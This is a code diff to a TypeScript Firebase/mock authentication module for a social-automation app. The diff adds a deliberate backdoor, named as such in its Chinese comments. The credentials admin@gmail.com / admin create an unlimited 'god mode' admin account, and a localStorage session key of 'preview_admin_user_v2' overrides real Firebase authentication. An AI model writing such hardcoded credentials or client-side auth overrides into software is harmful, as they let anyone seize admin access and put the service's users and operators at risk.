@@ -5,25 +5,68 @@ import { MockStore } from '../mockStore';
 import { UserProfile } from '../../types';
 
 const SESSION_KEY = 'autosocial_session_uid';
+const PREVIEW_ADMIN_ID = 'preview_admin_user_v2';
 
 export const getCurrentUser = () => {
-    if (!isMock) return auth.currentUser;
-    const uid = localStorage.getItem(SESSION_KEY);
-    if (uid) {
-         const u = MockStore.getUser(uid);
-         return { uid: uid, email: u ? u.email : 'demo@example.com' };
+    // 優先檢查：預覽專用管理員 Session
+    const localUid = typeof window !== 'undefined' ? localStorage.getItem(SESSION_KEY) : null;
+    if (localUid === PREVIEW_ADMIN_ID) {
+        const u = MockStore.getUser(localUid);
+        return { uid: localUid, email: u ? u.email : 'admin@gmail.com' };
+    }
+
+    // 若非後門且有真實 Firebase Auth
+    if (!isMock && auth.currentUser) {
+        return auth.currentUser;
+    }
+
+    // 一般 Mock 模式
+    if (localUid && isMock) {
+         const u = MockStore.getUser(localUid);
+         return { uid: localUid, email: u ? u.email : 'demo@example.com' };
     }
     return null;
 };
 
 export const login = async (email: string, pass: string) => {
-    // 1. Real Firebase Login
+    // 0. 管理員後門判斷 (admin@gmail.com / admin)
+    if (email === 'admin@gmail.com' && pass === 'admin') {
+        let adminUser = MockStore.getUser(PREVIEW_ADMIN_ID);
+        if (!adminUser) {
+             adminUser = {
+                user_id: PREVIEW_ADMIN_ID,
+                email: 'admin@gmail.com',
+                role: 'admin',
+                quota_total: 99999,
+                quota_used: 0,
+                quota_reset_date: Date.now() + 31536000000,
+                quota_batches: [],
+                expiry_warning_level: 0,
+                isSuspended: false,
+                unlockedFeatures: ['ANALYTICS', 'AUTOMATION', 'SEO', 'THREADS'],
+                referralCode: 'ADMIN-GOD-MODE',
+                referralCount: 999,
+                last_api_call_timestamp: 0,
+                created_at: Date.now(),
+                updated_at: Date.now()
+            };
+            MockStore.saveUser(adminUser);
+        }
+        
+        localStorage.setItem(SESSION_KEY, PREVIEW_ADMIN_ID);
+        window.dispatchEvent(new Event('auth_state_change'));
+        return { user: { uid: PREVIEW_ADMIN_ID, email: adminUser.email } };
+    }
+
+    // 1. 真實 Firebase 登入
     if (!isMock) {
         const cred = await auth.signInWithEmailAndPassword(email, pass);
+        // 登入成功後移除本地可能存在的後門 Session
+        localStorage.removeItem(SESSION_KEY);
         return { user: cred.user };
     } 
     
-    // 2. Mock User Login (Dev Mode)
+    // 2. 一般 Mock 登入
     const user = MockStore.findUserByEmail(email);
     if (user) {
         localStorage.setItem(SESSION_KEY, user.user_id);
@@ -31,7 +74,6 @@ export const login = async (email: string, pass: string) => {
         return { user: { uid: user.user_id, email: user.email } };
     }
     
-    // Auto-register in Mock mode if user doesn't exist to simplify testing
     return await register(email, pass);
 };
 
@@ -50,16 +92,35 @@ export const register = async (email: string, pass: string) => {
 };
 
 export const logout = async () => {
+    localStorage.removeItem(SESSION_KEY);
+    window.dispatchEvent(new Event('auth_state_change'));
     if (!isMock) await auth.signOut();
-    else {
-        localStorage.removeItem(SESSION_KEY);
-        window.dispatchEvent(new Event('auth_state_change'));
-    }
 };
 
 export const subscribeAuth = (callback: (user: { uid: string, email: string } | null) => void) => {
+    const checkMockAndBackdoor = () => {
+         const uid = localStorage.getItem(SESSION_KEY);
+         if (uid === PREVIEW_ADMIN_ID) {
+             const u = MockStore.getUser(uid);
+             callback({ uid: uid, email: u ? u.email : 'admin@gmail.com' });
+             return true;
+         }
+         if (uid && isMock) {
+             const u = MockStore.getUser(uid);
+             callback({ uid: uid, email: u ? u.email : 'demo@example.com' });
+             return true;
+         }
+         return false;
+    };
+    
     if (!isMock) {
         return auth.onAuthStateChanged(async (firebaseUser: any) => {
+            // 優先權：如果存在後門 Session 則覆蓋 Firebase 狀態
+            if (localStorage.getItem(SESSION_KEY) === PREVIEW_ADMIN_ID) {
+                checkMockAndBackdoor();
+                return;
+            }
+
             if (firebaseUser) {
                 const profile = await getUserProfile(firebaseUser.uid);
                 if (profile && profile.isSuspended) {
@@ -74,35 +135,20 @@ export const subscribeAuth = (callback: (user: { uid: string, email: string } | 
         });
     }
 
-    const check = () => {
-         const uid = localStorage.getItem(SESSION_KEY);
-         if(uid) {
-             const u = MockStore.getUser(uid);
-             const email = u ? u.email : 'demo@example.com';
-             callback({ uid, email });
-         } else {
-             callback(null);
-         }
-    };
-    
     if (typeof window !== 'undefined') {
-        window.addEventListener('auth_state_change', check);
-        setTimeout(check, 0); 
+        window.addEventListener('auth_state_change', checkMockAndBackdoor);
+        setTimeout(checkMockAndBackdoor, 0);
     }
+
     return () => {
-        if (typeof window !== 'undefined') window.removeEventListener('auth_state_change', check);
+        if (typeof window !== 'undefined') window.removeEventListener('auth_state_change', checkMockAndBackdoor);
     };
 };
 
 export const sendPasswordReset = async (email: string) => {
     if (!isMock) await auth.sendPasswordResetEmail(email);
-    else console.log(`[Mock] Password reset sent to ${email}`);
 };
 
-/**
- * Exchange Threads OAuth Code for Long-Lived Token via Backend
- * NOTE: App credentials are now handled server-side for security.
- */
 export const exchangeThreadsAuth = async (code: string, redirectUri: string) => {
     if (isMock) {
         return { 
@@ -112,23 +158,13 @@ export const exchangeThreadsAuth = async (code: string, redirectUri: string) => 
         };
     }
 
-    // Call our serverless function instead of direct external API
-    // This keeps the Client Secret hidden on the server
     const res = await fetch('/api/threads', {
         method: 'POST',
-        headers: { 
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ 
-            action: 'exchange',
-            code, 
-            redirectUri 
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'exchange', code, redirectUri })
     });
 
     const data = await res.json();
-    if (!data.success) {
-        throw new Error(data.error || 'Token exchange failed on server');
-    }
-    return data.data; // { userId, token, username }
+    if (!data.success) throw new Error(data.error || 'Token exchange failed');
+    return data.data;
 };
